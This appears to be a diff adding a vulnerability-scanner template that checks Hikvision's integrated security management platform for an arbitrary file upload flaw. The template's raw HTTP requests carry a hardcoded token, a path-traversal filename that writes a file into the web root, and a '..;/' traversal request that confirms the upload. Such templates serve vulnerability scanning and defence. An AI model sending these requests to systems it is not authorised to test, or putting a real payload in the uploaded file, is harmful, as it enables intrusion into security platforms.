@@ -1,0 +1,42 @@
+id: hikvision-iSecure-Center-uploadAllPackage-fileupload
+info:
+  name: 海康威视综合安防管理平台uploadAllPackage任意文件上传漏洞
+  author: leadlife
+  severity: critical
+  description: 
+  reference:
+    - 
+  metadata:
+    verified: false
+    fofa-query:
+  tags: hikvision,fileupload,iot
+
+variables:
+    filename: "{{to_lower(rand_base(4))}}"
+    date: '{{date_time("%Y%M%D%H%M%S")}}'
+
+http:
+  - raw:
+      - |
+        POST /center_install/picUploadService/v1/uploadAllPackage/image HTTP/1.1
+        Host: {{Hostname}}
+        Token: SElLIGlhL3NmaGNjaTY3WWxWK0Y6UzVCcjg1a2N1dENqVUNIOUM3SE1GamNkN2dnTE1BN1dGTDJldFE0UXFvbz0=
+        Content-Type: multipart/form-data; boundary=--------------------------553898708333958420021355
+
+        ----------------------------553898708333958420021355
+        Content-Disposition: form-data; name="sendfile"; filename="../../../../components/tomcat85linux64.1/webapps/eportal/{{filename}}.js"
+        Content-Type: application/octet-stream
+
+        112233
+        ----------------------------553898708333958420021355--
+        
+      - |+
+        GET /portal/ui/login/..;/..;/{{filename}}.js HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code_1 == 200 && status_code_2 == 200
+          - contains(body_2,'112233')
+        condition: and
